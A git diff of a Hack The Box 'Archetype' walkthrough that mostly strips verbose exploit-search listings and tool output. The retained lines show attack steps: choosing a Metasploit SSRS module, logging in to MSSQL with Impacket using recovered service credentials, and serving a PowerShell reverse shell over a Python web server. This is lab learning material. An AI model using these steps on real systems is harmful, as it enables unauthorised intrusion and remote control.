@@ -105,62 +105,7 @@ This is a good start.  As usual, we look for a web domain to gain a foothold.  T
 
 However, I did find [this](https://resources.infosecinstitute.com/topic/attacking-ms-sql-server-gain-system-access/) on the web, and keeping in mind my initial thoughts on HTB, this looks very convenient!
 
-From the link, we see that ExploitDB has some things:
-```
-$ searchsploit mssql  
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                        |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-ADODB 4.6/4.7 - 'Tmssql.php' Cross-Site Scripting                                                                                     | php/webapps/28104.txt
-ADODB < 4.70 - 'tmssql.php' Denial of Service                                                                                         | php/dos/1651.php
-AutoDealer 1.0/2.0 - MSSQL Injection                                                                                                  | php/webapps/12462.txt
-MSSQL 7.0 - Remote Denial of Service                                                                                                  | windows/dos/562.c
-PHP 4.4.6 - 'mssql_[p]connect()' Local Buffer Overflow                                                                                | windows/local/3417.php
-XAMPP for Windows 1.6.0a - 'mssql_connect()' Remote Buffer Overflow                                                                   | windows/remote/3738.php
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
-
-$ searchsploit sql | grep -i 'microsoft'
-CA BrightStor Agent for Microsoft SQL - Remote Overflow (Metasploit)                                                                  | windows/remote/16403.rb
-Microsoft BizTalk Server 2000/2002 DTA - 'RawCustomSearchField.asp' SQL Injection                                                     | asp/webapps/22555.txt
-Microsoft BizTalk Server 2000/2002 DTA - 'rawdocdata.asp' SQL Injection                                                               | asp/webapps/22554.txt
-Microsoft Source Code Analyzer for SQL Injection 1.3 - Improper Permissions                                                           | windows/local/16991.txt
-Microsoft SQL 2000/7.0 - Agent Jobs Privilege Escalation                                                                              | windows/remote/21718.txt
-Microsoft SQL Server - 'sp_replwritetovarbin()' Heap Overflow                                                                         | windows/local/7501.asp
-Microsoft SQL Server - Database Link Crawling Command Execution (Metasploit)                                                          | windows/remote/23649.rb
-Microsoft SQL Server - Distributed Management Objects 'sqldmo.dll' Buffer Overflow (PoC)                                              | windows/dos/4379.html
-Microsoft SQL Server - Distributed Management Objects Buffer Overflow                                                                 | windows/remote/4398.html
-Microsoft SQL Server - Hello Overflow (MS02-056) (Metasploit)                                                                         | windows/remote/16398.rb
-Microsoft SQL Server - Payload Execution (Metasploit)                                                                                 | windows/remote/16395.rb
-Microsoft SQL Server - Payload Execution (via SQL Injection) (Metasploit)                                                             | windows/remote/16394.rb
-Microsoft SQL Server - Resolution Overflow (MS02-039) (Metasploit)                                                                    | windows/remote/16393.rb
-Microsoft SQL Server - sp_replwritetovarbin Memory Corruption (MS09-004) (Metasploit)                                                 | windows/remote/16392.rb
-Microsoft SQL Server - sp_replwritetovarbin Memory Corruption (MS09-004) (via SQL Injection) (Metasploit)                             | windows/remote/16396.rb
-Microsoft SQL Server 2000 - 'SQLXML' Buffer Overflow (PoC)                                                                            | windows/dos/21540.txt
-Microsoft SQL Server 2000 - Database Consistency Checkers Buffer Overflow                                                             | windows/remote/21650.txt
-Microsoft SQL Server 2000 - Password Encrypt procedure Buffer Overflow                                                                | windows/local/21549.txt
-Microsoft SQL Server 2000 - Resolution Service Heap Overflow                                                                          | windows/remote/21652.cpp
-Microsoft SQL Server 2000 - sp_MScopyscript SQL Injection                                                                             | windows/remote/21651.txt
-Microsoft SQL Server 2000 - SQLXML Script Injection                                                                                   | windows/remote/21541.txt
-Microsoft SQL Server 2000 - User Authentication Remote Buffer Overflow                                                                | windows/remote/21693.nasl
-Microsoft SQL Server 2000 / Microsoft Jet 4.0 Engine - Unicode Buffer Overflow (PoC)                                                  | windows/dos/21569.txt
-Microsoft SQL Server 7.0 - Remote Denial of Service (1)                                                                               | windows/dos/24639.c
-Microsoft SQL Server 7.0 - Remote Denial of Service (2)                                                                               | windows/dos/24640.c
-Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_displayparamstmt Buffer Overflow                                            | windows/local/20451.c
-Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_peekqueue Buffer Overflow                                                   | windows/local/20457.c
-Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_showcolv Buffer Overflow                                                    | windows/local/20456.c
-Microsoft SQL Server 7.0/2000 / MSDE - Named Pipe Denial of Service (MS03-031)                                                        | windows/dos/22957.cpp
-Microsoft SQL Server 7.0/2000 JET Database Engine 4.0 - Buffer Overrun                                                                | windows/dos/22576.txt
-Microsoft SQL Server 7.0/7.0 SP1 - NULL Data Denial of Service                                                                        | windows/dos/19638.c
-Microsoft SQL Server Management Studio 17.9 - '.xel' XML External Entity Injection                                                    | windows/local/45585.txt
-Microsoft SQL Server Management Studio 17.9 - '.xmla' XML External Entity Injection                                                   | windows/local/45587.txt
-Microsoft SQL Server Management Studio 17.9 - XML External Entity Injection                                                           | windows/local/45583.txt
-Microsoft SQL Server Reporting Services 2016 - Remote Code Execution                                                                  | windows/remote/48816.py
-Microsoft Windows SQL Server - Remote Denial of Service (MS03-031)                                                                    | windows/dos/65.c
-Oracle MySQL for Microsoft Windows - Payload Execution (Metasploit)                                                                   | windows/remote/16957.rb
-```
-
-So, there are a lot of exploits, it seems.  We need to choose one...  We know that the `mssql` server version this machine is using is from 2017.
+From the link, we see that ExploitDB has some things.  So, there are a lot of exploits, it seems.  We need to choose one...  We know that the `mssql` server version this machine is using is from 2017.
 
 Let's quickly have a look at the [CLI for `mssql`](https://opensource.com/article/18/1/ms-sql-command-line-client) before we have a go at the metasploit results.  We need to first run:
 ```bash
@@ -179,31 +124,8 @@ searchsploit -m 23649
 At this point, I realise I have very little knowledge of how to use metasploit, so I found [this video](https://www.youtube.com/watch?v=8lR27r8Y_ik) which helped me understand.  So entering the `msfconsole` and we search for exploits:
 ```
 msf6 > search type:exploit platform:windows microsoft sql
-
-Matching Modules
-================
-
-   #   Name                                                      Disclosure Date  Rank       Check  Description
-   -   ----                                                      ---------------  ----       -----  -----------
-   0   exploit/multi/mysql/mysql_udf_payload                     2009-01-16       excellent  No     Oracle MySQL UDF Payload Execution
-   1   exploit/windows/brightstor/sql_agent                      2005-08-02       average    No     CA BrightStor Agent for Microsoft SQL Overflow
-   2   exploit/windows/http/ssrs_navcorrector_viewstate          2020-02-11       excellent  Yes    SQL Server Reporting Services (SSRS) ViewState Deserialization
-   3   exploit/windows/iis/msadc                                 1998-07-17       excellent  Yes    MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
-   4   exploit/windows/mssql/ms02_039_slammer                    2002-07-24       good       Yes    MS02-039 Microsoft SQL Server Resolution Overflow
-   5   exploit/windows/mssql/ms02_056_hello                      2002-08-05       good       Yes    MS02-056 Microsoft SQL Server Hello Overflow
-   6   exploit/windows/mssql/ms09_004_sp_replwritetovarbin       2008-12-09       good       Yes    MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption
-   7   exploit/windows/mssql/ms09_004_sp_replwritetovarbin_sqli  2008-12-09       excellent  Yes    MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
-   8   exploit/windows/mssql/mssql_clr_payload                   1999-01-01       excellent  Yes    Microsoft SQL Server Clr Stored Procedure Payload Execution
-   9   exploit/windows/mssql/mssql_linkcrawler                   2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
-   10  exploit/windows/mssql/mssql_payload                       2000-05-30       excellent  Yes    Microsoft SQL Server Payload Execution
-   11  exploit/windows/mssql/mssql_payload_sqli                  2000-05-30       excellent  No     Microsoft SQL Server Payload Execution via SQL Injection
-   12  exploit/windows/mysql/mysql_mof                           2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows MOF Execution
-   13  exploit/windows/mysql/mysql_start_up                      2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse
-   14  exploit/windows/postgres/postgres_payload                 2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
-
-
-Interact with a module by name or index. For example info 14, use 14 or use exploit/windows/postgres/postgres_payload
 ```
+
 Recall that we are dealing with Microsoft SQL Server 2017, and only one of these has an Disclosure Date of later than that, so we choose that one:
 ```
 msf6 > use exploit/windows/http/ssrs_navcorrector_viewstate
@@ -344,15 +266,8 @@ We run `get prod.dtsConfig` to get the file in the backup directory.  It looks l
 
 It looks like there is a password and username here!  We recall from Passage that we have Impacket's `mssqlclient.py` script, and we use it here:
 ```bash
-$ git clone https://github.com/SecureAuthCorp/impacket
-Cloning into 'impacket'...
-remote: Enumerating objects: 41, done.
-remote: Counting objects: 100% (41/41), done.
-remote: Compressing objects: 100% (32/32), done.
-remote: Total 18922 (delta 25), reused 20 (delta 9), pack-reused 18881
-Receiving objects: 100% (18922/18922), 6.27 MiB | 3.79 MiB/s, done.
-Resolving deltas: 100% (14401/14401), done.
-                                                                                                                                                                        
+$ git clone https://github.com/SecureAuthCorp/impacket; 
+
 $ python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -433,27 +348,7 @@ And the port to the one you want to use (e.g., `1234`).
 
 To host this reverse shell file. we need to set up a mini server.  We do this by, on our machine, running a python command (be sure to do this in the same directory as your powershell reverse shell file!):
 ```bash
-$ python3 -m http.server 80
-Traceback (most recent call last):
-  File "/usr/lib/python3.9/runpy.py", line 197, in _run_module_as_main
-    return _run_code(code, main_globals, None,
-  File "/usr/lib/python3.9/runpy.py", line 87, in _run_code
-    exec(code, run_globals)
-  File "/usr/lib/python3.9/http/server.py", line 1289, in <module>
-    test(
-  File "/usr/lib/python3.9/http/server.py", line 1244, in test
-    with ServerClass(addr, HandlerClass) as httpd:
-  File "/usr/lib/python3.9/socketserver.py", line 452, in __init__
-    self.server_bind()
-  File "/usr/lib/python3.9/http/server.py", line 1287, in server_bind
-    return super().server_bind()
-  File "/usr/lib/python3.9/http/server.py", line 138, in server_bind
-    socketserver.TCPServer.server_bind(self)
-  File "/usr/lib/python3.9/socketserver.py", line 466, in server_bind
-    self.socket.bind(self.server_address)
-PermissionError: [Errno 13] Permission denied
-                                                                                                                                                                        
-$ sudo python3 -m http.server 80                                                                                                                                  1 ⨯
+$ sudo python3 -m http.server 80
 [sudo] password for jakeireland:
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
